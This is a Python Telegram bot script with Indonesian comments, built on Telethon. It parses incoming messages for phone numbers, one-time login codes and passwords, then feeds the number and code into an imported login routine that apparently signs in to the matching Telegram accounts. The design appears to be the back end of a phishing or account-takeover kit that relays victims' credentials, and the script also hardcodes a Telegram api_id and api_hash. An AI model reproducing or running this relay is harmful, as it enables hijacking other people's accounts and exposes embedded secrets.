from telethon import TelegramClient, events
import re
from send_request_login import TelegramBot
# Ganti dengan api_id dan api_hash yang kamu dapatkan dari my.telegram.org
api_id = '22003089'
api_hash = '2681d1c1b490e153681df7c0d6b20a3b'


# Token bot yang kamu dapatkan dari BotFather
bot_token = input("ENTER YOUR BOT TOKEN : ")

phone_number = ""
Code = ""
password = ""
# Membuat instance client
client = TelegramClient('bot_session', api_id, api_hash)

def extract_phone_number(message_text):
    match = re.search(r'\+(\d+)', message_text)
    if match:
        return match.group(0)
    return None
def extract_code(message_text):
    # Mencari kata "Code" diikuti oleh data setelahnya
    match = re.search(r'Code\s*(\d+)', message_text)  # Bisa mencari angka atau teks setelah "Code"
    if match:
        return match.group(1)  # Mengembalikan data yang ditemukan setelah "Code"
    return None
def extract_password(message_text):
    # Mencari kata "Code" diikuti oleh data setelahnya
    match = re.search(r'Password\s*([\w\d]+)', message_text)  # Bisa mencari angka atau teks setelah "Code"
    if match:
        return match.group(1)  # Mengembalikan data yang ditemukan setelah "Code"
    return None

# Menghubungkan bot ke Telegram menggunakan token
@client.on(events.NewMessage)
async def handler(event):
    incoming_message = event.message.text
    print(f"Pesan Masuk: {incoming_message}")

    # Mencari nomor HP setelah '+' dengan menggunakan regex
    phone_number = extract_phone_number(incoming_message)
    Code = extract_code(incoming_message)
    password = extract_password(incoming_message)
    bot = TelegramBot(api_id, api_hash)
    if phone_number :
        print(f"Nomor HP ditemukan: {phone_number}")
        # Balas pesan dengan nomor HP yang ditemukan
        await bot.login(phone_number)
    else:
        print("Nomor HP tidak ditemukan dalam pesan.")

    if Code:
        print(f"Otp ditemukan : {Code}")
        await bot.login(phone_number, Code)
    else:
        print("Code belum dimasukkan ")

    if password:
        print(f"password ditemukan : {password}")
    else:
        print("Password belum dimasukkan ")


async def main():
    # Menghubungkan bot ke Telegram menggunakan token
    await client.start(bot_token=bot_token)
    print("Bot siap menerima pesan!")

    # Menjalankan bot hingga dihentikan
    await client.run_until_disconnected()


# Menjalankan program
import asyncio

asyncio.run(main())